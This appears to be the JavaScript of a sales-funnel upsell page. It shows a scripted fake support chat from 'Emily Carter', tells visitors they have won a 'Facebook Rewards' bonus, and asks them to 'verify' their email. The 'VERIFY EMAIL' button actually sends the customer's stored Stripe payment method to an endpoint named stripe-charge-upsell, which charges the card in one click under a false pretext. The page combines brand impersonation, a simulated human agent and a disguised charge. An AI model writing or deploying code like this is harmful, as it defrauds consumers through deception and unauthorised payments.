<script>
  // ==========================================
  // CONFIGURAÇÃO DOS PLACEHOLDERS DESTE UPSELL
  // ==========================================
  const WORKER_URL         = 'https://metapay-v2.vinicio-bdf.workers.dev/api/stripe-charge-upsell';
  const UPSELL_NUMBER      = 1;
  const URL_DESTINO_RECUSA = '/up2';
  const URL_OBRIGADO_FINAL = '/up2';

  // Resgata os parâmetros da sessão enviados pelo Checkout via URL (cid, pm, email, etc.)
  const urlParams = new URLSearchParams(window.location.search);
  const cid       = urlParams.get('cid');
  const pm        = urlParams.get('pm');
  const email     = urlParams.get('email');
  const name      = urlParams.get('name') || urlParams.get('nome');

  function getSafeUrl(url, fallback) {
    if (!url || url.indexOf('{{') !== -1) return fallback;
    return url;
  }

  // 🟢 1. COMPRA COM 1 CLIQUE
  async function buyUpsell() {
    const btn = document.getElementById('btn-upsell');
    const inputEmail = document.getElementById('upsell-email');
    
    if (!cid || !pm) {
      const fallbackUrl = getSafeUrl(URL_OBRIGADO_FINAL, '../up2/index.html');
      window.location.href = fallbackUrl + (fallbackUrl.includes('?') ? '&' : '?') + urlParams.toString();
      return;
    }

    btn.disabled  = true;
    btn.innerHTML = 'PROCESSING...';

    try {
      const chosenEmail = (inputEmail && inputEmail.value.trim()) || email;
      const response = await fetch(WORKER_URL + window.location.search, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_id: cid,
          payment_method_id: pm,
          upsell_number: UPSELL_NUMBER,
          email: chosenEmail,
          name: name,
          extra_params: Object.fromEntries(urlParams.entries())
        })
      });

      const data = await response.json();

      if (data && data.next_url) {
        btn.innerHTML = 'CONFIRMED! 🚀';
        window.location.replace(data.next_url);
      } else {
        const destRecusa = getSafeUrl(URL_DESTINO_RECUSA, '../up2/index.html');
        window.location.replace(destRecusa + (destRecusa.includes('?') ? '&' : '?') + urlParams.toString());
      }
    } catch (err) {
      console.error(err);
      const destObrigado = getSafeUrl(URL_OBRIGADO_FINAL, '../up2/index.html');
      window.location.replace(destObrigado + (destObrigado.includes('?') ? '&' : '?') + urlParams.toString());
    }
  }

  // 🔴 2. RECUSA ("No thanks")
  function declineUpsell(e) {
    e.preventDefault();
    const destRecusa = getSafeUrl(URL_DESTINO_RECUSA, '../up2/index.html');
    const sep = destRecusa.includes('?') ? '&' : '?';
    window.location.replace(destRecusa + sep + urlParams.toString() + '&declined=true');
  }

  // ==========================================
  // SIMULAÇÃO DE CHAT EM TEMPO REAL (DIGITANDO)
  // ==========================================
  function supportScroll() {
    const chat = document.getElementById("support-chat");
    if (chat) chat.scrollTop = chat.scrollHeight;
  }

  function supportTyping(show) {
    const chat = document.getElementById("support-chat");
    const old = document.getElementById("support-typing");
    if (old) old.remove();
    if (!show || !chat) return;

    const row = document.createElement("div");
    row.id = "support-typing";
    row.className = "support-row";
    row.innerHTML = '<img class="support-mini-avatar" src="../images/emily-support.webp" alt="Emily Carter"><div class="support-bubble support-typing"><span></span><span></span><span></span></div>';
    chat.appendChild(row);
    supportScroll();
  }

  function addMessage(html, alignTop) {
    const chat = document.getElementById("support-chat");
    if (!chat) return;
    supportTyping(false);

    const row = document.createElement("div");
    row.className = "support-row" + (alignTop ? " align-top" : "");
    row.innerHTML = '<img class="support-mini-avatar" src="../images/emily-support.webp" alt="Emily Carter">' + html;
    chat.appendChild(row);
    supportScroll();
  }

  // Fila de mensagens simulando interação real de chat
  const chatSequence = [
    {
      type: "typing",
      ms: 800
    },
    {
      type: "message",
      html: '<div class="bonus-pill-bubble"><span class="bonus-pill-icon">★</span> <span>You Just Won a Bonus!</span></div>',
      pauseAfter: 800
    },
    {
      type: "typing",
      ms: 1200
    },
    {
      type: "message",
      html: '<div class="support-bubble">Congratulations! A special bonus has been unlocked <strong>exclusively for you</strong>.</div>',
      pauseAfter: 1000
    },
    {
      type: "typing",
      ms: 1400
    },
    {
      type: "message",
      html: '<div class="support-bubble">To release your bonus and avoid fraud, Facebook Rewards <strong>requires email confirmation</strong> on every first withdrawal.</div>',
      pauseAfter: 1100
    },
    {
      type: "typing",
      ms: 1300
    },
    {
      type: "message",
      html: '<div class="support-bubble">Enter the email linked to your account below and confirm. Your bonus will be released instantly.</div>',
      pauseAfter: 900
    },
    {
      type: "typing",
      ms: 1100
    },
    {
      type: "message",
      alignTop: true,
      html: `
        <div class="verification-card">
          <h3 class="verification-title">EMAIL VERIFICATION REQUIRED</h3>
          <p class="verification-text">
            Facebook Rewards needs to confirm your email before releasing your bonus. This protects your balance and unlocks instant withdrawal.
          </p>
          <div class="verification-input-wrap">
            <input id="upsell-email" type="email" class="verification-input" placeholder="Enter the email linked to your account" autocomplete="email">
          </div>
          <div class="upsell-actions-container">
            <button id="btn-upsell" class="btn-upsell-submit" onclick="buyUpsell()">
              VERIFY EMAIL
            </button>
            <a id="btn-decline" href="#" class="link-upsell-decline" onclick="declineUpsell(event)">
              No thanks, I don't want this offer
            </a>
          </div>
          <p class="verification-note">
            A confirmation link will be sent to your inbox. Can't find it? Check spam.
          </p>
        </div>
      `,
      onRender: function() {
        const input = document.getElementById("upsell-email");
        if (input && email) {
          input.value = email;
        }
      }
    }
  ];

  let seqIdx = 0;
  function runChatSequence() {
    if (seqIdx >= chatSequence.length) return;
    const item = chatSequence[seqIdx++];

    if (item.type === "typing") {
      supportTyping(true);
      setTimeout(runChatSequence, item.ms);
    } else if (item.type === "message") {
      addMessage(item.html, item.alignTop);
      if (item.onRender) item.onRender();
      if (item.pauseAfter) {
        setTimeout(runChatSequence, item.pauseAfter);
      } else {
        runChatSequence();
      }
    }
  }

  // Dispara a animação assim que a página carregar
  window.addEventListener("DOMContentLoaded", function() {
    setTimeout(runChatSequence, 400);
  });
</script>
</body>
</html>
